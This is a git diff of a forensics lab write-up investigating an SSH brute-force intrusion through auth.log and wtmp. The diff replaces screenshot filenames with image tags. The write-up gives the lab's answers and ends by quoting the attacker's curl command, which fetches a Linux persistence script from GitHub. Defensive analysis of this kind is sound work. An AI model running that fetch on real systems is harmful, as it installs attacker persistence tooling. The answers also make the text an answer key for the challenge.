@@ -22,7 +22,8 @@ I searched for successful authentications using the keyword “Accepted password
 
 cat auth.log| grep -i accepted
 
-AcceptedPasswordBrutus.png
+<img width="1920" height="1080" alt="AcceptedPasswordBrutus" src="https://github.com/user-attachments/assets/392a7cf7-f3cd-41bb-8b6c-52198b12a907" />
+
 
 Answer: Root
 
@@ -30,7 +31,8 @@ Q) Identify the UTC timestamp when the attacker logged in manually to the server
 
 The attacker first brute-forced the credentials, but their actual manual login session is recorded in the wtmp log, not in auth.log. Since wtmp is a binary file, I used the last -f ./wtmp -F
 
-FirstTimeLoggedBrutus.png
+<img width="1920" height="1080" alt="FirstTimeLoggedBrutus" src="https://github.com/user-attachments/assets/fcb8a7d0-1d46-4d47-86e1-8c87fdab6025" />
+
 
 Answer: 2024-03-06 06:32:45
 
@@ -40,7 +42,8 @@ To identify the session number assigned during the attacker’s login, I filtere
 
 cat auth.log | grep -i '06:32:4'
 
-LogonSessionIDBrutus.png
+<img width="1920" height="1080" alt="LogonSessionIDBrutus" src="https://github.com/user-attachments/assets/033bc5f7-8dd2-4433-8906-b6d0a3091efc" />
+
 
 Answer: 37
 
@@ -50,7 +53,7 @@ Using grep to search for user creation activity (keywords such as “add”), I 
 
 cat auth.log | grep -i add
 
-UserAddedBrutus.png
+<img width="1920" height="1080" alt="UserAddedBrutus" src="https://github.com/user-attachments/assets/d1b8daf6-b1ff-4786-9549-f271aeb28b6d" />
 
 Answer: cyberjunkie
 
@@ -58,7 +61,8 @@ Q) What is the MITRE ATT&CK sub-technique ID used for persistence by creating a 
 
 Creating a new local account for persistence aligns with the MITRE ATT&CK Framework’s “Create Account” technique under the Persistence tactic.
 
-MitreBrutus.png
+<img width="1920" height="1080" alt="MitreBrutus" src="https://github.com/user-attachments/assets/422fad66-5ead-47c4-ad48-81c3d542d910" />
+
 
 Answer:  T1136.001 
 
@@ -66,7 +70,8 @@ Q) What time did the attacker's first SSH session end according to auth.log?
 
 To determine when the attacker’s SSH session ended, I filtered the auth.log using grep tool with keyword `logged out’ entries associated with the root account.
 
-LoggedOutBrutus.png
+<img width="1920" height="1080" alt="LoggedOutBrutus" src="https://github.com/user-attachments/assets/519541b1-9caa-4eae-831b-8b180b12cbf5" />
+
 
 Answer: 2024-03-06 06:37:24
 
@@ -76,6 +81,7 @@ After reviewing auth.log for activity tied to the newly created user cyberjunkie
 
 cat auth.log | grep -i curl
 
-DownloadedScriptBrutus.png
+<img width="1920" height="1080" alt="DownloadedScriptBrutus" src="https://github.com/user-attachments/assets/4ea0f0b5-062a-4d4f-8a5d-27d4eb0e0a98" />
+
 
 Answer: /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
